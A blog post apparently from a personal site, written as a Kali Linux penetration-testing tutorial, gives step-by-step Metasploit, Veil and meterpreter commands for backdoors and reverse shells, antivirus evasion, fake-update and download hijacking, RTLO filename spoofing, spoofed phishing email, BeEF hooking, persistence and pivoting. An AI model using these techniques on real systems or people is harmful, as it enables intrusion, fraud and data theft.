@@ -1,0 +1,472 @@
+
+<!DOCTYPE html>
+<html lang="english">
+
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />     <meta name="robots" content="" />     <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro|Source+Sans+Pro:300,400,400i,700" rel="stylesheet">     <link rel="stylesheet" type="text/css" href="https://jackmckew.dev/theme/stylesheet/style.min.css"> 
+    <link rel="stylesheet" type="text/css" href="https://jackmckew.dev/theme/pygments/github.min.css">
+    <link rel="stylesheet" type="text/css" href="https://jackmckew.dev/theme/font-awesome/css/fontawesome.css">
+    <link rel="stylesheet" type="text/css" href="https://jackmckew.dev/theme/font-awesome/css/brands.css">
+    <link rel="stylesheet" type="text/css" href="https://jackmckew.dev/theme/font-awesome/css/solid.css">
+    <link rel="stylesheet" type="text/css" href="https://jackmckew.dev/theme/font-awesome.css">     <script src="https://jackmckew.dev/theme/tipuesearch/jquery.min.js"></script>
+    <script src="https://jackmckew.dev/theme/tipuesearch/tipuesearch.min.js"></script>
+    <script src="https://jackmckew.dev/theme/tipuesearch/tipuesearch.js"></script>
+    <script src="https://jackmckew.dev/theme/tipuesearch/tipuesearch_set.js"></script>
+    <link rel="stylesheet" href="https://jackmckew.dev/theme/tipuesearch/tipuesearch.css" />
+    <script src="https://jackmckew.dev/tipuesearch_content.js"></script>
+    <link href="https://jackmckew.dev/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Jack McKew's Blog Atom">     <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+    <link rel="icon" href="/favicon.ico" type="image/x-icon"> <!-- Google Analytics -->
+<script type="text/javascript">
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-131173168-2', 'auto');
+  ga('send', 'pageview');
+</script>
+<!-- End Google Analytics --><meta name="author" content="Jack McKew" />
+<meta name="description" content="This post will go into ways we can use Kali Linux to gain access to the target PCs! What is Kali Linux? &#34;Kali Linux is a Debian-based Linux distribution aimed at advanced Penetration Testing and Security Auditing&#34;. Kali Linux is free to download and you can find it at: https …" />
+<meta name="keywords" content="software, infosec">
+
+
+<meta property="og:site_name" content="Jack McKew's Blog"/>
+<meta property="og:title" content="Gaining Access with Kali Linux"/>
+<meta property="og:description" content="This post will go into ways we can use Kali Linux to gain access to the target PCs! What is Kali Linux? &#34;Kali Linux is a Debian-based Linux distribution aimed at advanced Penetration Testing and Security Auditing&#34;. Kali Linux is free to download and you can find it at: https …"/>
+<meta property="og:locale" content="en_US"/>
+<meta property="og:url" content="https://jackmckew.dev/gaining-access-with-kali-linux.html"/>
+<meta property="og:type" content="article"/>
+<meta property="article:published_time" content="2020-09-04 00:00:00+10:00"/>
+<meta property="article:modified_time" content=""/>
+<meta property="article:author" content="https://jackmckew.dev/author/jack-mckew.html">
+<meta property="article:section" content="Software"/>
+<meta property="article:tag" content="software"/>
+<meta property="article:tag" content="infosec"/>
+<meta property="og:image" content="https://jackmckew.dev/img/nexpose.jpg">
+
+    <title>Jack McKew's Blog &ndash; Gaining Access with Kali Linux</title>
+
+</head>
+
+<body>
+    <aside>
+        <div>
+            <a href="https://jackmckew.dev">
+        <img src="/jm-photo.jpg" alt="Jack McKew's Blog" title="Jack McKew's Blog">
+      </a>
+            <h1><a href="https://jackmckew.dev">Jack McKew's Blog</a></h1>
+
+            <p>Engineer | Software Developer | Data Scientist</p>            <p>Number of Posts: 80</p>
+            <p>Number of Words: 57,101</p>
+            <p>Number of Lines of Code 4,025</p>
+            <form class="navbar-search" action="/search.html" role="search">
+                <input type="text" name="q" id="tipue_search_input" placeholder="Search..">
+            </form>
+            <style>
+                .bmc-button img {
+                    height: 34px !important;
+                    width: 35px !important;
+                    margin-bottom: 1px !important;
+                    box-shadow: none !important;
+                    border: none !important;
+                    vertical-align: middle !important;
+                }
+                
+                .bmc-button {
+                    margin-top: 15px !important;
+                    margin-bottom: 20px !important;
+                    padding: 7px 15px 7px 10px !important;
+                    line-height: 35px !important;
+                    height: 51px !important;
+                    text-decoration: none !important;
+                    display: inline-flex !important;
+                    color: #ffffff !important;
+                    /* background-color: #FF813F !important; */
+                    border-radius: 5px !important;
+                    border: 1px solid transparent !important;
+                    padding: 7px 15px 7px 10px !important;
+                    font-size: 22px !important;
+                    letter-spacing: 0.6px !important;
+                    box-shadow: 0px 1px 2px rgba(190, 190, 190, 0.5) !important;
+                    -webkit-box-shadow: 0px 1px 2px 2px rgba(190, 190, 190, 0.5) !important;
+                    font-family: 'Cookie', cursive !important;
+                    -webkit-box-sizing: border-box !important;
+                    box-sizing: border-box !important;
+                }
+                
+                .bmc-button:hover,
+                .bmc-button:active,
+                .bmc-button:focus {
+                    -webkit-box-shadow: 0px 1px 2px 2px rgba(190, 190, 190, 0.5) !important;
+                    text-decoration: none !important;
+                    box-shadow: 0px 1px 2px 2px rgba(190, 190, 190, 0.5) !important;
+                    opacity: 0.85 !important;
+                    color: #ffffff !important;
+                }
+            </style>
+            <link href="https://fonts.googleapis.com/css?family=Cookie" rel="stylesheet">
+            <a class="bmc-button btn" target="_blank" href="https://www.buymeacoffee.com/jackmckew"><img src="https://jackmckew.dev/theme/img/pizza.png" alt="🍕"><span style="margin-left:5px;font-size:28px !important;">Buy me a Pizza</span></a>
+            <br>
+            <a href="https://feedburner.google.com/fb/a/mailverify?uri=JackMckewsBlog&amp;loc=en_US" class="mbscreenphone phonelink btn btn-info btn-lg">
+                Subscribe by Email <i class="fas fa-envelope"></i>
+              </a>             <nav>
+                <ul class="list">
+                    <li><a target="_blank" href="https://jackmckew.dev/pages/contact.html#contact">Contact</a></li>
+                    <li><a target="_blank" href="https://jackmckew.dev/pages/cv-professional.html#cv-professional">CV/Professional</a></li>
+                </ul>
+            </nav>
+
+            <ul class="social">
+                <li>
+                    <a  class="sc-twitter" href="https://twitter.com/Jac_McQ" target="_blank">
+                        <i class="fab fa-twitter">
+            </i>
+                    </a>
+                </li>
+                <li>
+                    <a  class="sc-linkedin" href="https://www.linkedin.com/in/jack-mckew/" target="_blank">
+                        <i class="fab fa-linkedin">
+            </i>
+                    </a>
+                </li>
+                <li>
+                    <a  class="sc-github" href="https://github.com/JackMcKew" target="_blank">
+                        <i class="fab fa-github">
+            </i>
+                    </a>
+                </li>
+            </ul>
+        </div>
+
+
+    </aside>
+    <main>
+        <nav>
+            <a href="https://jackmckew.dev"> Home</a>             <a href="/archives.html">Archives</a>             <a href="/categories.html">Categories</a>             <a href="/tags.html">Tags</a>             <a href="/sitemap.xml">Sitemap</a>             <a href="https://jackmckew.dev/feeds/all.atom.xml"> Atom</a>         </nav>
+<article class="single">
+  <header>
+      
+    <h1 id="gaining-access-with-kali-linux">Gaining Access with Kali Linux</h1>
+    <p>
+       Posted on Fri 04 September 2020 in <a href="https://jackmckew.dev/category/software.html">Software</a>
+
+        &#8226; 10 min read
+    </p>
+  </header>
+
+
+  <div>
+    <body><p>This post will go into ways we can use Kali Linux to gain access to the target PCs! What is Kali Linux? "Kali Linux is a Debian-based Linux distribution aimed at advanced Penetration Testing and Security Auditing". Kali Linux is free to download and you can find it at: <a href="https://www.kali.org/downloads/">https://www.kali.org/downloads/</a>.</p>
+<p>This post is apart of a series of posts, see the other posts at:</p>
+<ul>
+<li><a href="https://jackmckew.dev/network-hacking-with-kali-linux.html">Network Hacking with Kali Linux</a></li>
+</ul>
+<blockquote>
+<p>Thank you to Chris B for helping me with the notes in this post below!</p>
+</blockquote>
+<h2 id="table-of-contents">Table of Contents <!-- omit in toc --></h2>
+<ul>
+<li><a href="#gaining-access">Gaining Access</a><ul>
+<li><a href="#server-side-attacks">Server Side Attacks</a><ul>
+<li><a href="#metasploit">Metasploit</a></li>
+<li><a href="#exploiting-backdoors">Exploiting Backdoors</a><ul>
+<li><a href="#an-example-backdoor-attack">An Example Backdoor Attack</a></li>
+<li><a href="#payloads">Payloads</a></li>
+</ul>
+</li>
+<li><a href="#nexpose">Nexpose</a></li>
+</ul>
+</li>
+<li><a href="#client-side-attacks">Client Side Attacks</a><ul>
+<li><a href="#creating-backdoors">Creating Backdoors</a><ul>
+<li><a href="#connecting-from-the-backdoor">Connecting from the Backdoor</a></li>
+<li><a href="#deploying-backdoors-via-fake-updates">Deploying Backdoors via Fake Updates</a></li>
+<li><a href="#deploying-backdoors-via-exe-downloads">Deploying Backdoors via Exe Downloads</a></li>
+</ul>
+</li>
+<li><a href="#protection">Protection</a></li>
+</ul>
+</li>
+<li><a href="#social-engineering">Social Engineering</a><ul>
+<li><a href="#maltego">Maltego</a></li>
+<li><a href="#backdooring-any-file-type">Backdooring Any File Type</a><ul>
+<li><a href="#spoofing-file-type">Spoofing File Type</a></li>
+</ul>
+</li>
+<li><a href="#spoofing-fake-emails">Spoofing Fake Emails</a></li>
+<li><a href="#beef-browser-exploitation-framework">BeEF (Browser Exploitation Framework)</a></li>
+<li><a href="#using-the-above---outside-the-local-network">Using the Above - Outside the Local Network</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#post-exploitation">Post Exploitation</a><ul>
+<li><a href="#maintaining-access">Maintaining Access</a></li>
+<li><a href="#pivoting">Pivoting</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="gaining-access">Gaining Access</h2>
+<p>Any electronic device is a computer all concepts will work wether it is a phone, tv, router, websites, webservers etc
+Two types of attacks:</p>
+<ol>
+<li>Server side - Doesn't require user interaction all we need is an IP</li>
+<li>Client side - Requires user interaction such as opening a file or clicking a link</li>
+</ol>
+<h3 id="server-side-attacks">Server Side Attacks</h3>
+<p>Make sure the machine is pingable (open terminal and run <code>ping [IP]</code>). Learning as much as possible about the target is essential for conducting a successful attack, if you can learn things such as:</p>
+<ul>
+<li>Operating systems</li>
+<li>Installed programs</li>
+<li>Ports being used</li>
+<li>etc</li>
+</ul>
+<p>We can then use this information for identifying potential exploits (search engines are perfect for this). Things to look out for are:</p>
+<ul>
+<li>Run Zenmap (Nmap) on the IP. Click the ports and services tab up the top to learn about the ports being used / misconfigured.</li>
+<li>Google the version of operating system / programs for potential exploits</li>
+<li>If you find an open FTP (file transfer protocol) port, try to connect through it</li>
+<li>Try default usernames and passwords to log in (sometimes they won't have a password)</li>
+</ul>
+<h4 id="metasploit">Metasploit</h4>
+<p>Metasploit is a penetration testing framework that makes hacking simple. It's an essential tool for many attackers and defenders. Point Metasploit at your target, pick an exploit, what payload to drop, and hit Enter. Before testing metasploit on a live system, it's preferential to test on a virtualised system, enter metasploitable. Metasploitable is an intentionally vulnerable target machine for evaluating Metasploit which is virtualised and can be downloaded from: <a href="https://information.rapid7.com/download-metasploitable-2017.html">https://information.rapid7.com/download-metasploitable-2017.html</a>.</p>
+<h4 id="exploiting-backdoors">Exploiting Backdoors</h4>
+<p>First from the information you've gathered about the target, we can then search for what exploits are available, and to use metasploit is as easy as:</p>
+<ul>
+<li><code>msfconsole</code> (runs the metasploit console)</li>
+<li><code>help</code> (help on any command)</li>
+<li><code>show [something]</code> (something can be exploits, payloads, auxilaries or options)</li>
+<li><code>use [something]</code> (uses an exploit, payload, auxilarie)</li>
+<li><code>set [option] [value]</code> (configure [option] to have [value] )</li>
+<li><code>exploit</code> - runs the current task</li>
+</ul>
+<h5 id="an-example-backdoor-attack">An Example Backdoor Attack</h5>
+<p>Typically this will only work if the backdoor is already installed on the target computer.</p>
+<ol>
+<li>find out the exploit to use via google</li>
+<li>open <code>msfconsole</code></li>
+<li>type <code>use [exploit_name/path]</code></li>
+<li><code>show options</code></li>
+<li>set the options (usually the RHOSTS) `set RHOSTS [ip]</li>
+<li>run <code>exploit</code></li>
+</ol>
+<p>If this is successful, you will now have access to a remote terminal in the target and essentially do anything you want on the target machine.</p>
+<h5 id="payloads">Payloads</h5>
+<p>A payload is a piece of code that is to be executed through an existing exploit. For example twp types of payloads are to:</p>
+<ul>
+<li>to open a port on the target and connect to it (aka <code>bind</code>)</li>
+<li>open a port on the attacking computer, connect to the attacking computer from the target bypassing the firewall (aka <code>reverse</code>)</li>
+</ul>
+<blockquote>
+<p>On a <code>reverse</code>, setting the open port on the attacking computer to 80, will mimic that of a typical webserver and thus also bypassing any firewall filtration.</p>
+</blockquote>
+<p>Setting a payload in metasploit can be done with the option <code>set payload [payload]</code>.</p>
+<h4 id="nexpose">Nexpose</h4>
+<p>Nexpose is another product from the creators of metasploitable, and it is a vulnerability scanner. Nexpose will find any available exploits in your network that could be used, this could be used from a red team (attacker) and blue team (defender) perspective!</p>
+<p><a href="https://www.rapid7.com/products/nexpose/"><img alt="Nexpose" class="img-fluid" src="https://jackmckew.dev/img/nexpose.jpg"/></a></p>
+<p>Nexpose can be downloaded from: <a href="https://www.rapid7.com/products/nexpose/">https://www.rapid7.com/products/nexpose/</a>.</p>
+<blockquote>
+<p>There is a free community edition!</p>
+</blockquote>
+<h3 id="client-side-attacks">Client Side Attacks</h3>
+<p>Client side attacks are typically the next step if server side attacks fail or are not viable in the situation. Although, client side attacks can potentially be more difficult to accomplish as we are now (likely) depending on the weakest link in the security to be the human rather than a computer. In client side attacks, social engineering is one of the most used attack vectors, which also means that gaining as much information as possible about the target is critical for a successful attack.</p>
+<h4 id="creating-backdoors">Creating Backdoors</h4>
+<p>For creating backdoors we use a program called <code>veil</code>. Veil can installed via <code>apt-get</code>, and the source code is all open over at: <a href="https://github.com/Veil-Framework/Veil">https://github.com/Veil-Framework/Veil</a>.</p>
+<p>To use Veil: (use evasion, and use a rev_https (aka reverse https connection)):</p>
+<ol>
+<li>Run <code>veil</code></li>
+<li><code>list</code> to list available tools</li>
+<li><code>use [toolname]</code> to use tools, evasion is a typical tool to use</li>
+<li><code>list</code> (under a tool) to see available payloads</li>
+<li><code>use [payload number]</code></li>
+<li>check the options to set</li>
+<li>be sure to set the LHOST (the IP for the target to connect to)</li>
+<li><code>set LHOST [ip]</code></li>
+<li>if you have a webserver running change to port, a good port is 8080 (an alternate port used by webservers)</li>
+<li><code>set LPORT 8080</code></li>
+<li><code>options</code> to see options.</li>
+</ol>
+<blockquote>
+<p>For bypassing more antivirus programs, the more options you change, the less likely an existing identified signature is out there, we can change these options with
+    1.  <code>set PROCESSORS [number(1)]</code> change processors.
+    2.  <code>set SLEEP [number(6)]</code></p>
+</blockquote>
+<p>Finally use <code>generate</code> to make backdoor.</p>
+<ul>
+<li>To check if it is detectable you can use the check vt command (this will only check signatures)</li>
+<li>go to <a href="https://nodistribute.com/">https://nodistribute.com/</a> and scan there</li>
+</ul>
+<h5 id="connecting-from-the-backdoor">Connecting from the Backdoor</h5>
+<p>We need to listen for the connection. Need the attack payload and the port (eg, go/meterpeter/rev_https, 8080)</p>
+<ol>
+<li>Open the metasploit framework. <code>msfconsole</code></li>
+<li>To listen use the handler module</li>
+<li><code>use exploit/multi/handler</code></li>
+<li>set the payload <code>set PAYLOAD windows/meterpeter/reverse_https</code></li>
+<li>set the correct settings (the LPORT and LHOST you used in the backdoor).</li>
+<li><code>exploit</code></li>
+</ol>
+<p>Now we wait for the target user to run the backdoor (the <code>.exe</code> file).</p>
+<h5 id="deploying-backdoors-via-fake-updates">Deploying Backdoors via Fake Updates</h5>
+<p>By mimicking an update server for a software package, we can hide out backdoor as a new update for a software. To do this we use <code>Evilgrade</code> (which is also fully open source): <a href="https://github.com/infobyte/evilgrade">https://github.com/infobyte/evilgrade</a>. Once <code>evilgrade</code> is installed, you can check hijackable programs using <code>show modules</code>, configure options for said modules using <code>configure [module_name]</code> and start <code>evilgrade</code> with <code>start</code>.</p>
+<p>This then makes use of MITM attacks such as ARP or DNS spoofing, read more about these in my previous post at [INSERT KALI NETWORK HACKING POST].</p>
+<blockquote>
+<p>When using evilgrade, ensuring that the exploit is listening before mimicking the update server with the malicious software.</p>
+</blockquote>
+<h5 id="deploying-backdoors-via-exe-downloads">Deploying Backdoors via Exe Downloads</h5>
+<p>Another way to deploy backdoors, is to intercept an <code>.exe</code> that is being downloaded on the target and replace it with the malicious <code>.exe</code>. It's necessary to be the MITM to undertake this attack.</p>
+<p>One way to do this (although unsupported as of 08/2017) is via BDFProxy: <a href="https://github.com/secretsquirrel/BDFProxy">https://github.com/secretsquirrel/BDFProxy</a>.</p>
+<p>Once up and running, whenever a user attempts to download an <code>.exe</code>, it'll be intercepted and injected with the malicious backdoor. Note that the target <code>.exe</code> will be downloaded and run as normal, not raising any suspicions from the user.</p>
+<h4 id="protection">Protection</h4>
+<ul>
+<li>Ensure that there is no MITM in your network</li>
+<li>Only download from HTTPS pages</li>
+<li>Use checksums to ensure the download is as the provider desired it to be (eg, MD5)</li>
+</ul>
+<h3 id="social-engineering">Social Engineering</h3>
+<p>The definition of social engineering (in information security context) is: "the use of deception to manipulate individuals into divulging confidential or personal information that may be used for fraudulent purposes.". The aim of the game is to gather as much information as possible about our target such that we can better pose an attack.</p>
+<h4 id="maltego">Maltego</h4>
+<p>Maltego is a piece of software that we can easily &amp; quickly gather information about a target, it can be downloaded from: <a href="https://www.maltego.com/">https://www.maltego.com/</a>. It can be used to determine where a specific target has accounts, websites, phone numbers, etc and who they may connect with. It shows all this in a graph representation in the client.</p>
+<h4 id="backdooring-any-file-type">Backdooring Any File Type</h4>
+<p>This is typically done by compiling a malicious script and then disguising it as the source file. Note that this may not work for more technically advanced targets, as when you change the icon for a <code>.exe</code> file, there will still be a prompt to run this file when opened.</p>
+<p>For example, if you are trying to disguise a PDF, normally users aren't asked to run a PDF when opened, so this may raise suspicions with the target, and potentially foiling the attack.</p>
+<h5 id="spoofing-file-type">Spoofing File Type</h5>
+<p>In the above example, we highlighted concerns that our file will prompt to be run and have the extension <code>.exe</code>. We can circumvent this problem by spoofing our executable to look as if it was the original file type (eg, <code>.pdf</code>). One way to do this is by using the right to left unicode character in the filename (<code>U+202E</code>).</p>
+<p>So what we will do is if our target file that we want to disguise as is name <code>the-book-of-reflex.pdf</code>. We will name our malicious executable as <code>the-book-of-reflfdp.exe</code>, and insert a right to left unicode character before <code>fdp.exe</code>, which will reverse the end of our file, thus ending up with <code>the-book-of-reflexe.pdf</code>.</p>
+<blockquote>
+<p>Browsers will typically remove the right to left unicode character in file names, so make sure to zip the malicious file to bypass this.</p>
+</blockquote>
+<h4 id="spoofing-fake-emails">Spoofing Fake Emails</h4>
+<p>There's lots of free options out there on the web for sending fake emails, but they will likely end up in the spam box of the target's email. Another option is to find a SMTP (Simple Mail Transfer Protocol) server that offers a free program, typically these are used for marketing by companies so less likely to end up in the spam.</p>
+<p>Kali also provides a utility called <code>sendemail</code> which we can use once we have a SMTP server to use. Find out more about this utility (with the source code) over at: <a href="https://github.com/mogaal/sendemail">https://github.com/mogaal/sendemail</a>.</p>
+<p>Once we're able to send a fake email, we can now embed our spoofed malicious executable on a file sharing website (eg, Google drive) and include it in the email (see <a href="#backdooring-any-file-type">Backdooring Any File Type</a>).</p>
+<blockquote>
+<p>It's advisable to use an existing email that you know your target is familiar with from the information that you've gathered.</p>
+</blockquote>
+<h4 id="beef-browser-exploitation-framework">BeEF (Browser Exploitation Framework)</h4>
+<p>From the BeEF website itself: "BeEF is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser.". You can also find the source code over at <a href="https://github.com/beefproject/beef">https://github.com/beefproject/beef</a>.</p>
+<p>What BeEF let's us do is insert some JavaScript code onto a website to 'hook' the website, allowing us to do lots of different things (eg, fake login pages, etc). Since the hook is just embedded in sites with JavaScript, this will enable attacks on any modern browser and device (eg, phones, tablets, laptops, etc).</p>
+<p>Once hooked you get all sorts of information on the target system including browser version, operating system, versions of capabilities (plugins) installed etc.</p>
+<blockquote>
+<p>It is easiest to deploy BeEF and run the commands when you are the MITM in the network. This will also allow us to hook <strong>all</strong> websites the user visits rather than just the one.</p>
+</blockquote>
+<p>One example command we can use is to mimic a browser plug-in update to get the target to download and run a malicious backdoor.</p>
+<h4 id="using-the-above-outside-the-local-network">Using the Above - Outside the Local Network</h4>
+<p>If you are using any of these attacks external to your local network, there's a few steps to configure to ensure:</p>
+<ol>
+<li>Router must handle reverse connections</li>
+<li>Use public IP vs Private IP of the router</li>
+<li>Forward the targeted port of the router to the attacking machine in the local network</li>
+</ol>
+<h2 id="post-exploitation">Post Exploitation</h2>
+<p>The main part of launching a hack is not only to get access to a target PC, but get/find what's on the target and make sure that we can always get into the target. Another prime example on conducting a hack on a target PC, may not be to get to that exact machine, more so to get into the network that machine is connected to and find other resources (this is also known as pivoting).</p>
+<h3 id="maintaining-access">Maintaining Access</h3>
+<p>Once you have backdoored into a system, the backdoor connection is likely running on a process (similar to what you see in task manager on Windows), it's typically good practice to migrate the backdoor connection onto a process that is unlikely to be closed (eg, <code>explorer.exe</code>). If you are using metasploit for this, it's as easy as running <code>migrate [processID]</code>.</p>
+<p>There's also other methodologies for maintaining access such as:</p>
+<ul>
+<li>Using veil-evasion (see <a href="#creating-backdoors">Creating Backdoors</a>)</li>
+<li>Use metasploit persistence to maintain the connection</li>
+<li>Use metasploit and veil-evasion together:<ol>
+<li>Background your current meterpeter session <code>background</code></li>
+<li>use a module in msfconsole <code>use exsploit/windows/local/persistance</code></li>
+<li><code>show options</code> to configure</li>
+<li><code>set EXE_NAME browser</code> (or something inconspicuous)</li>
+<li>set the session you wish to place <code>set SESSION [no.]</code></li>
+<li>use the EXE::Custom the inject veil backdoor (not service).</li>
+<li><code>set EXE::Custom [path]</code></li>
+<li><code>exploit</code></li>
+</ol>
+</li>
+</ul>
+<h3 id="pivoting">Pivoting</h3>
+<p>Use the device you hacked, hack into other devices on the intranet. We can set up an autoroute to use metasploit on the infected target as if it was the source attacking device.</p>
+<ol>
+<li>Upload any tools you need. (in metasploit) eg. Nmap</li>
+<li>use autoroute (in metasploit)</li>
+<li><code>use post/windows/manage/autoroute</code></li>
+<li><code>set subnet [subnet]</code> - Set the subnet to the first 3 dots then 0 ie. xx.xx.xx.0</li>
+<li><code>set session [id]</code> - Sets the session to run it on.</li>
+<li><code>exploit</code></li>
+</ol></body>
+  </div>
+  <div class="tag-cloud">
+    <p>
+      <a href="https://jackmckew.dev/tag/software.html">software</a>
+      <a href="https://jackmckew.dev/tag/infosec.html">infosec</a>
+    </p>
+  </div>
+
+
+  <div class="neighbors">
+    <a class="btn float-left" href="https://jackmckew.dev/network-hacking-with-kali-linux.html" title="Network Hacking with Kali Linux">
+      <i class="fa fa-angle-left"></i>  Previous Post
+    </a>
+  </div>
+
+  <div class="related-posts">
+    <h4> You might enjoy</h4>
+    <ul class="related-posts">
+      <li><a href="https://jackmckew.dev/episode-12-what-is-git.html">Episode 12 - What is Git?</a></li>
+    </ul>
+  </div>
+
+
+<!-- Disqus -->
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'jackmckew-dev';
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>
+     Please enable JavaScript to view comments.
+</noscript>
+<!-- End Disqus -->
+</article>
+
+        <footer>
+<p>&copy;  </p>
+<p> Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme</p>        </footer>
+    </main>
+
+<script type="application/ld+json">
+{
+  "@context" : "http://schema.org",
+  "@type" : "Blog",
+  "name": " Jack McKew's Blog ",
+  "url" : "https://jackmckew.dev",
+  "image": "/jm-photo.jpg",
+  "description": ""
+}
+</script><a href="https://github.com/JackMcKew/jackmckew.dev" class="github-corner" aria-label="View source on Github">
+    <svg width="80"
+         height="80"
+         viewBox="0 0 250 250"
+         style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;"
+         aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor"
+              style="transform-origin: 130px 106px;"
+              class="octo-arm">
+        </path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor"
+              class="octo-body">
+        </path>
+    </svg>
+</a>
+<style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>    <script>
+        $(document).ready(function() {
+            $('#tipue_search_input').tipuesearch();
+        });
+    </script>
+</body>
+
+</html>
